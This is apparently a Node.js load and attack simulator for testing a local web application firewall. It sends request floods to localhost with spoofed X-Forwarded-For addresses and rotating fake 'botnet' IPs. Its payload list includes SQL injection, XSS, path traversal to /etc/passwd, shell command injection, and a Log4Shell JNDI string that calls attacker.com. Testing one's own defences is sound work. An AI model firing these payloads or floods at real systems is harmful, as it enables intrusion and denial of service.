const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const defaultSpammers = [
    '71.6.146.185',
    '80.82.77.139',
    '61.146.163.4',
    '70.34.245.215',
    '203.0.113.42',
    '198.51.100.12',
    '203.0.113.55',
    '109.244.11.89',
    '45.22.103.112',
    '88.99.100.54'
];

// Reference list of common words to build realistic brute force wordlists
const referenceWords = [
    'admin', 'password', 'secret', 'flower', 'chia', 'florist', 'rose', 'tulip', 'bloom',
    'flower123', 'love', 'sweet', 'garden', 'spring', 'petal', 'orchid', 'daisy', 'lily',
    'pass', 'root', 'security', 'login', 'system', 'access', 'gateway', 'server', 'token',
    'medan', 'cikarang', 'shop', 'order', 'checkout', 'staff', 'merchant', 'admin123'
];

const maliciousPayloads = [
    'union select 1,2,3',
    '\' OR \'1\'=\'1',
    '<script>alert(1)</script>',
    '../../etc/passwd',
    '; ls -la',
    '${jndi:ldap://attacker.com/a}'
];

const generateSimulationPath = (index) => {
    // 80% chance: clean request to /products
    if (Math.random() < 0.80) {
        const word = referenceWords[index % referenceWords.length];
        return `/products?name=${encodeURIComponent(word)}`;
    }
    // 20% chance: malicious attack
    const payload = maliciousPayloads[index % maliciousPayloads.length];
    return `/products?name=${encodeURIComponent(payload)}`;
};

let stats = {
    total: 0,
    blocked429: 0,
    blocked403: 0,
    allowed200: 0,
    failed: 0
};

// Generates a randomized password from letters, numbers, and word lists
const generateRandomPassword = (index) => {
    // 50% chance: Choose a word from reference list and randomize capitalization/suffixes
    if (Math.random() < 0.5) {
        const baseWord = referenceWords[index % referenceWords.length];
        const chars = baseWord.split('');
        // Randomly capitalize letters
        const formattedWord = chars.map(c => Math.random() < 0.3 ? c.toUpperCase() : c.toLowerCase()).join('');
        const suffixNum = Math.floor(Math.random() * 999);
        return `${formattedWord}${suffixNum}`;
    }

    // 50% chance: Generate random alphanumeric string (realistic hash/password format)
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let length = Math.floor(Math.random() * 6) + 6; // Length between 6 and 11
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return result;
};

const generateRandomIP = (refIP) => {
    // Generate a fully randomized IP address using octet boundaries
    const o1 = Math.floor(Math.random() * 220) + 1; // 1-220 to avoid reserved ranges
    const o2 = Math.floor(Math.random() * 255);
    const o3 = Math.floor(Math.random() * 255);
    const o4 = Math.floor(Math.random() * 255);
    return `${o1}.${o2}.${o3}.${o4}`;
};

const sendSpam = (ip, count, path, targetPort, callback) => {
    const options = {
        hostname: 'localhost',
        port: targetPort,
        path: path,
        method: 'GET',
        headers: {
            'x-simulated-ip': ip, // spoof client IP
            'X-Forwarded-For': ip,
            'User-Agent': 'SpamBot/2.0'
        }
    };

    const req = http.request(options, (res) => {
        stats.total++;
        if (res.statusCode === 429) {
            stats.blocked429++;
        } else if (res.statusCode === 403) {
            stats.blocked403++;
        } else if (res.statusCode === 200) {
            stats.allowed200++;
        }
        res.on('data', () => { });
        res.on('end', callback);
    });

    req.on('error', (e) => {
        stats.failed++;
        callback();
    });
    req.end();
};

function runSpam(reqsPerIP, ipCount, intervalMs) {
    stats = { total: 0, blocked429: 0, blocked403: 0, allowed200: 0, failed: 0 };
    const ips = defaultSpammers.slice(0, ipCount);
    
    console.log(`\n🚀 Launching Spam Simulation...`);
    console.log(`- Targeting: http://localhost:7129/`);
    console.log(`- Request count: ${reqsPerIP} reqs per IP`);
    console.log(`- Unique IPs: ${ips.length}`);
    console.log(`- Interval: ${intervalMs}ms between requests`);
    console.log(`- Total Projected Requests: ${reqsPerIP * ips.length}\n`);

    let completedRequests = 0;
    const totalTarget = reqsPerIP * ips.length;

    const onComplete = () => {
        completedRequests++;
        if (completedRequests >= totalTarget) {
            printSummary();
            rl.close();
        }
    };

    ips.forEach((ip) => {
        let sent = 0;
        const interval = setInterval(() => {
            const path = generateSimulationPath(sent);
            sendSpam(ip, sent, path, 7129, onComplete);
            sent++;
            if (sent % 20 === 0) {
                console.log(`[${ip}] Sent ${sent}/${reqsPerIP} requests...`);
            }

            if (sent >= reqsPerIP) {
                clearInterval(interval);
            }
        }, intervalMs);
    });
}

function runRandomizedSpamCycle(totalSpam, reqsPerIP, intervalMs) {
    stats = { total: 0, blocked429: 0, blocked403: 0, allowed200: 0, failed: 0 };
    
    console.log(`\n🌀 Launching Rotating Botnet (Realistic Brute Force) Simulation...`);
    console.log(`- Total Request Target : ${totalSpam}`);
    console.log(`- Requests per Bot IP  : ${reqsPerIP}`);
    console.log(`- Interval between reqs: ${intervalMs}ms`);
    console.log(`- Total Unique Bot IPs : ${Math.ceil(totalSpam / reqsPerIP)}\n`);

    let totalSent = 0;
    let refIndex = 0;

    const onComplete = () => {
        if (stats.total >= totalSpam) {
            printSummary();
            rl.close();
        }
    };

    function startNextBot() {
        if (totalSent >= totalSpam) return;

        // Select reference IP and randomize it
        const refIP = defaultSpammers[refIndex % defaultSpammers.length];
        const botIP = generateRandomIP(refIP);
        refIndex++;

        // Determine how many requests this specific bot should send (handle remaining)
        const botLimit = Math.min(reqsPerIP, totalSpam - totalSent);
        let botSent = 0;

        console.log(`\n🤖 [Bot Active] IP: ${botIP} (Reference: ${refIP})`);
        console.log(`-> Commencing Brute Force Attack with ${botLimit} wordlist attempts...`);

        const interval = setInterval(() => {
            const path = generateSimulationPath(totalSent);
            
            sendSpam(botIP, botSent, path, 7129, onComplete);
            botSent++;
            totalSent++;

            if (botSent >= botLimit) {
                clearInterval(interval);
                console.log(`🤖 [Bot Finished] IP: ${botIP} completed task.`);
                // Wait briefly before starting the next bot to make it look clean
                setTimeout(startNextBot, 200);
            }
        }, intervalMs);
    }

    // Start the first bot
    startNextBot();
}

function printSummary() {
    console.log(`
=========================================
      📊 SPAM/BRUTE-FORCE SUMMARY
=========================================
Total Requests Sent : ${stats.total}
Successful (200 OK) : ${stats.allowed200}
Rate Limited (429)  : ${stats.blocked429}
WAF Banned (403)    : ${stats.blocked403}
Failed (No Response): ${stats.failed}
=========================================
Check your Security Dashboard logs to see
the rate limiting and IP Banning logs!
`);
}

function showMenu() {
    console.clear();
    console.log(`
    ███████╗██████╗  █████╗ ███╗   ███╗
    ██╔════╝██╔══██╗██╔══██╗████╗  ████║
    ███████╗██████╔╝███████║██╔████╔██║  PORT: 7129
    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║  
    ███████║██║     ██║  ██║██║ ╚═╝ ██║  
    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
    
    [ Interactive WAF Spam/DDoS Simulator ]
    `);
    console.log("1. ☕  Light Brute-Force Spam (100 total requests - 4 IPs, 20ms interval)");
    console.log("2. 💥  Medium Brute-Force Attack (400 total requests - 4 IPs, 15ms interval)");
    console.log("3. 🌪️  Heavy DDoS Brute-Force (2000 total requests - 10 IPs, 10ms interval)");
    console.log("4. 🛠️  Custom Config (Specify requests & IPs)");
    console.log("5. 🌀  Rotating Botnet Brute-Force (Randomized IPs & Passwords)");
    console.log("0. ❌  Exit");

    rl.question('\nSelect Option: ', (choice) => {
        if (choice === '1') {
            runSpam(25, 4, 20);
        } else if (choice === '2') {
            runSpam(100, 4, 15);
        } else if (choice === '3') {
            runSpam(200, 10, 10);
        } else if (choice === '4') {
            rl.question('Enter number of requests per IP (e.g. 150): ', (reqsInput) => {
                const reqs = parseInt(reqsInput) || 50;
                rl.question('Enter number of unique IPs to spoof (1-10): ', (ipsInput) => {
                    let ips = parseInt(ipsInput) || 4;
                    if (ips < 1) ips = 1;
                    if (ips > 10) ips = 10;
                    rl.question('Enter interval in milliseconds (e.g. 10): ', (intInput) => {
                        const interval = parseInt(intInput) || 15;
                        runSpam(reqs, ips, interval);
                    });
                });
            });
        } else if (choice === '5') {
            rl.question('Enter total spam requests to send (e.g. 500): ', (totalInput) => {
                const total = parseInt(totalInput) || 500;
                rl.question('Enter requests per randomized IP (e.g. 50): ', (limitInput) => {
                    const limit = parseInt(limitInput) || 50;
                    rl.question('Enter interval in milliseconds (e.g. 15): ', (intInput) => {
                        const interval = parseInt(intInput) || 15;
                        runRandomizedSpamCycle(total, limit, interval);
                    });
                });
            });
        } else {
            console.log("Exiting...");
            rl.close();
        }
    });
}

showMenu();
